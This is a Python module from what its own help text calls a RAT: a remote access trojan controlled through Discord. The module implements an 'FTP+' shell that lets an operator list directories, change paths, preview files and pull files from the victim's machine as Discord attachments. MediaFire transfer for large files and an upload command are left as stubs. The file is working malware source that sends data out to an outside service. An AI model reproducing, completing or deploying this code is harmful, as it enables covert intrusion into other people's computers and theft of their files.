from shell.helpMenu import Menu, Command
from mediafire import MediaFireApi as mfApi
import discord, os, random

class FTPShell:
    def __init__(self, mainShell, mediafire=False) -> None:
        self.active = False
        self.hMenu = Menu({
            "help": Command("This **help menu**"),
            "ping": Command("See if the RAT is running in this channel\n + Some small **latency info**", (34, 218, 25)),
            "pwd": Command("Get current working **directory**", (224, 27, 27)),
            "ls": Command("**list** **files** in directory (max 20)", (224, 27, 27), ["dir"]),
            "lsall": Command("**list all files** in directory", (224, 27, 27), ["dirall"]),
            "cd": Command("Navigate the **filesystem**", (224, 27, 27), usage="`cd <DIRECTORY`\n or `cd ..` to exit an directory"),
            "get": Command("**Download** a file from the client (max 8MB)", (224, 27, 27), ["download", "pull"], "`get <FILE_TO_DOWNLOAD>`"),
            "getbig": Command("**Download** a large file from the client (through mediafire)", (224, 27, 27), ["downloadbig", "pullbig"], "`getbig <FILE_TO_DOWNLOAD>`"),
            "put": Command("**Upload** a file to the client", (224, 27, 27), ["upload", "give"], "`put <FILE_TO_UPLOAD>`"),
            "cat": Command("**Preview** the contents of a file (first 300 chars)", (224, 27, 27), usage="`cat <FILE>`"),
            "exit": Command("**Exit** the **FTP+** shell", (224, 27, 27)),
            "exit": Command("**Exit** the **FTP+** shell", (224, 27, 27), ["quit", "bye"])
        })
        self.cwd = os.path.dirname(os.path.realpath(__file__))
        self.shell = mainShell
        self.mediafire = {"enabled":mediafire}
        if mediafire:
            self.mediafire["api"] = mfApi()
            self.mediafire["api"].user_get_session_token(email=self.shell.mediafire["email"], password=self.shell.mediafire["password"], app_id=str(random.randint(10000, 99999)))

    def format_path(self, pathToFormat: str) -> str:
        newDir = self.cwd
        if "/" == pathToFormat[0]:
            newDir = "/"
            dirs = pathToFormat[1:].split("/")
        elif "C:\\" == pathToFormat[:3]:
            newDir = "C:\\"
            dirs = pathToFormat[3:].split("/")
        elif "/" in pathToFormat:
            dirs = pathToFormat.split("/")
        else:
            dirs = pathToFormat.split("\\")
        for d in dirs:
            if d == "..":
                newDir = os.path.dirname(newDir)
            elif d != ".":
                newDir = os.path.join(newDir, d)
        return newDir
    
    def path_exists(self, path: str) -> bool:
        try:
            os.listdir(path)
            return True
        except:
            return False

    async def process(self, message, cmd: list) -> None:
        if cmd[0] == "ping":
            await message.reply("**Pong!** (from FTP+)")
        elif cmd[0] == "help":
            if len(cmd) > 1:
                await message.reply(embed=self.hMenu.displayForCommand(cmd[1]))
            else:
                await message.reply(embed=self.hMenu.display())
        elif cmd[0] == "pwd":
            await message.reply("`"+self.cwd+"`")
        elif cmd[0] == "cd":
            if len(cmd) > 1:
                newDir = self.format_path(" ".join(cmd[1:]))
                if self.path_exists(newDir):
                    self.cwd = newDir
                    await message.reply("`"+self.cwd+"`")
                else:
                    await message.reply("**Error:** The provided directory does **not exist** or you don't have **permission**.\n> The provided dir: `"+newDir+"`")
            else:
                await message.reply("**Usage:** `cd <DIRECTORY>`")
        elif cmd[0] in ["ls", "dir", "lsall", "dirall"]:
            path = self.cwd
            if len(cmd) > 1:
                path = self.format_path(" ".join(cmd[1:]))
            try:
                files = os.listdir(path)
            except:
                return await message.reply("**Error:** Unable to list files in directory `"+path+"`")
            formated = []
            for file in files:
                if os.path.isfile(os.path.join(path, file)):
                    formated.append(file)
                else:
                    formated.append("**__"+file+"__**")
            output = ", ".join(formated)
            if cmd[0] in ["ls", "dir"]:
                if len(files) > 20:
                    output += "\n + `"+str(len(files)-20)+"` more..."
                await message.reply(embed=discord.Embed(
                    title="📜 "+cmd[0].upper()+" 📜",
                    description=output,
                    color=discord.Color.from_rgb(31, 35, 207)
                ))
            else:
                await message.reply(output)
        elif cmd[0] == "cat":
            if len(cmd) > 1:
                filePath = self.format_path(" ".join(cmd[1:]))
                if os.path.exists(filePath):
                    f = open(filePath)
                    preview = f.read()[:300]
                    preview += "\n\n.... "+str(len(f.read())-300)+" more characters ...." if len(f.read()) > 300 else ""
                    f.close()
                    try:
                        await message.reply("**__Preview of "+filePath.split("/")[-1].split("\\")[-1]+"__:**\n\n"+preview)
                    except:
                        await message.reply("**Error:** There was an error while sending the data to discord...\n> The provided file: `"+filePath+"`")
                else:
                    await message.reply("**Error:** The provided file does **not exist** or you don't have **permission**.\n> The provided file: `"+filePath+"`")
            else:
                await message.reply("**Usage:** `"+cmd[0]+" <FILE>`")
        elif cmd[0] in ["get", "download", "pull"]:
            if len(cmd) > 1:
                filePath = self.format_path(" ".join(cmd[1:]))
                if os.path.exists(filePath):
                    try:
                        await message.reply(file=discord.File(filePath))
                    except:
                        await message.reply("**Error:** The provided file is **too large** to download, max `8MB`\n> The provided file: `"+filePath+"`\n> Use `getbig <FILE>` to download large files (over 8MB)")
                else:
                    await message.reply("**Error:** The provided file does **not exist** or you don't have **permission**.\n> The provided file: `"+filePath+"`")
            else:
                await message.reply("**Usage:** `"+cmd[0]+" <FILE_TO_DOWNLOAD>`")
        elif cmd[0] in ["getbig", "downloadbig", "pullbig"]: # TODO add support for mediafire
            if self.mediafire["enabled"]:
                pass
            else:
                await message.reply("**Error:** In order to download large files, you need to have the **mediafire account** configured")
        elif cmd[0] in ["put", "upload", "give"]: # TODO
            if len(cmd) > 1:
                pass
            else:
                await message.reply("**Usage:** `"+cmd[0]+" <FILE_TO_UPLOAD>`")
        elif cmd[0] in ["exit", "quit", "bye"]:
            await message.reply("**Exiting** the FTP+ shel...")
            self.active = False
        else:
            await message.reply("**Invalid Command**")